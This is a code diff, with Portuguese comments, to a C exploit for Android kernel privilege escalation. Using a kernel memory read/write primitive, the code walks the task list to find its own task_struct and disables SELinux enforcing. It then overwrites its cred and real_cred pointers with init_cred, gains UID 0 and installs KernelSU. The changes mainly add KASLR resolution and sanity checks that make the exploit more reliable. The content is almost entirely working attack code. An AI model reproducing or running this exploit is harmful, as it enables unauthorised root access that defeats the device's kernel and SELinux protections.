@@ -144,23 +144,19 @@ static uintptr_t root_get_current_task_stack_scan(int fd) {
 
 /*
  * Método 2: Task list walk via PID.
- * USA data_addr(INIT_TASK) para resolver KASLR corretamente!
  */
 static uintptr_t root_get_current_task_pid_walk(int fd) {
   pid_t my_pid = getpid();
 
-  /* === CORREÇÃO CRÍTICA: usa data_addr() para resolver KASLR === */
   uintptr_t init_task_addr = data_addr(INIT_TASK);
 
   pr_info("root inline: PID walk looking for pid=%d from init_task=%016zx "
           "(raw=%016zx)\n", my_pid, init_task_addr, (uintptr_t)INIT_TASK);
 
-  /* Lê o ponteiro 'tasks' de init_task (list_head.next) */
   uint64_t first_tasks = 0;
   if (!root_read64(fd, init_task_addr + TASK_STRUCT_TASKS_OFF, &first_tasks)) {
     pr_error("root inline: failed to read init_task.tasks at %016zx\n",
              init_task_addr + TASK_STRUCT_TASKS_OFF);
-    /* Fallback: tenta ler via configfs (mais confiável) */
     if (!root_read_global(fd, init_task_addr + TASK_STRUCT_TASKS_OFF, 
                           &first_tasks, sizeof(first_tasks))) {
       pr_error("root inline: configfs fallback also failed\n");
@@ -172,22 +168,17 @@ static uintptr_t root_get_current_task_pid_walk(int fd) {
 
   pr_info("root inline: init_task.tasks.next=%016zx\n", first_tasks);
 
-  /* A lista é circular. O ponteiro tasks aponta para task_struct->tasks do vizinho.
-   * task_struct = tasks_ptr - TASK_STRUCT_TASKS_OFF
-   */
   uintptr_t current_tasks = first_tasks;
   const int max_iter = 20000;
 
   for (int i = 0; i < max_iter; i++) {
     uintptr_t task = current_tasks - TASK_STRUCT_TASKS_OFF;
 
-    /* Sanity check: deve estar em área de kernel */
     if ((task & 0xffff800000000000ULL) != 0xffff800000000000ULL) {
       pr_error("root inline: task list corrupted at iter=%d task=%016zx\n", i, task);
       return 0;
     }
 
-    /* Lê PID */
     uint32_t pid = 0;
     if (root_read32(fd, task + TASK_STRUCT_PID_OFF, &pid)) {
       if ((pid_t)pid == my_pid) {
@@ -199,14 +190,12 @@ static uintptr_t root_get_current_task_pid_walk(int fd) {
       }
     }
 
-    /* Debug: mostra os primeiros 10 PIDs */
     if (i < 10) {
       char comm[16] = {0};
       root_read_data(fd, task + TASK_STRUCT_COMM_OFF, comm, 15);
       pr_info("root inline: walk[%d] task=%016zx pid=%d comm=%s\n", i, task, pid, comm);
     }
 
-    /* Avança: lê list_head.next do nó atual */
     uint64_t next_tasks = 0;
     if (!root_read64(fd, current_tasks, &next_tasks)) {
       pr_error("root inline: failed to read next tasks at %016zx\n", current_tasks);
@@ -237,6 +226,9 @@ static uintptr_t root_get_current_task(int fd) {
   return 0;
 }
 
+/*
+ * Inline root escalation — sem fork+exec, sem binario externo.
+ */
 static int install_inline_root(int fd) {
   uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
   uint8_t permissive = 0;
@@ -272,6 +264,7 @@ static int install_inline_root(int fd) {
     pr_info("root selinux disabled\n");
   }
 
+  /* === 1. Achar o proprio task_struct === */
   uintptr_t current_task = root_get_current_task(fd);
   if (!current_task) {
     pr_error("root inline: failed to find current task_struct\n");
@@ -279,7 +272,28 @@ static int install_inline_root(int fd) {
   }
   pr_info("root inline: current_task=%016zx\n", current_task);
 
-  uint64_t init_cred = INIT_CRED_OFF;
+  /* === 2. Resolver init_cred COM KASLR === */
+  uint64_t init_cred = data_addr(INIT_CRED_OFF);
+  pr_info("root inline: init_cred=%016zx (raw=%016zx)\n", 
+          init_cred, (uint64_t)INIT_CRED_OFF);
+
+  /* === SANITY CHECK CRÍTICO: init_cred deve estar em área de kernel === */
+  if ((init_cred & 0xffff800000000000ULL) != 0xffff800000000000ULL) {
+    pr_error("root inline: init_cred looks invalid (not in kernel space): %016zx\n",
+             init_cred);
+    goto cleanup;
+  }
+
+  /* === SANITY CHECK: ler init_cred pra confirmar que é acessível === */
+  uint64_t init_cred_test = 0;
+  if (!root_read64(fd, init_cred, &init_cred_test)) {
+    pr_error("root inline: cannot read init_cred at %016zx — aborting to avoid panic\n",
+             init_cred);
+    goto cleanup;
+  }
+  pr_info("root inline: init_cred readable, first qword=%016zx\n", init_cred_test);
+
+  /* === 3. Escrever init_cred em cred e real_cred === */
   if (!root_write64_exact(fd, current_task + TASK_STRUCT_CRED_OFF, init_cred) ||
       !root_write64_exact(fd, current_task + TASK_STRUCT_REAL_CRED_OFF, init_cred)) {
     pr_error("root inline: cred overwrite failed\n");
@@ -287,6 +301,21 @@ static int install_inline_root(int fd) {
   }
   pr_info("root inline: cred -> init_cred\n");
 
+  /* === 4. Verificar readback antes de setuid === */
+  uint64_t cred_readback = 0, real_cred_readback = 0;
+  if (!root_read64(fd, current_task + TASK_STRUCT_CRED_OFF, &cred_readback) ||
+      !root_read64(fd, current_task + TASK_STRUCT_REAL_CRED_OFF, &real_cred_readback)) {
+    pr_error("root inline: cred readback failed\n");
+    goto cleanup;
+  }
+  if (cred_readback != init_cred || real_cred_readback != init_cred) {
+    pr_error("root inline: cred readback mismatch cred=%016zx real_cred=%016zx expected=%016zx\n",
+             cred_readback, real_cred_readback, init_cred);
+    goto cleanup;
+  }
+  pr_info("root inline: cred readback verified ok\n");
+
+  /* === 5. Aplicar no userspace === */
   if (setuid(0) != 0) {
     syscall(__NR_setuid, 0);
   }
@@ -300,6 +329,7 @@ static int install_inline_root(int fd) {
   }
   pr_info("root inline: UID=0 GID=0 achieved\n");
 
+  /* === 6. Instalar KernelSU === */
   const char *ksud_path = "/data/local/tmp/ksud";
   if (access(ksud_path, X_OK) == 0) {
     pr_info("root inline: installing KernelSU via %s\n", ksud_path);
@@ -311,7 +341,7 @@ static int install_inline_root(int fd) {
       pr_error("root inline: ksud install failed ret=%d\n", ret);
     }
   } else {
-    pr_info("root inline: ksud not found, attempting shell\n");
+    pr_info("root inline: ksud not found, root achieved without permanent install\n");
     result = 1;
   }
 
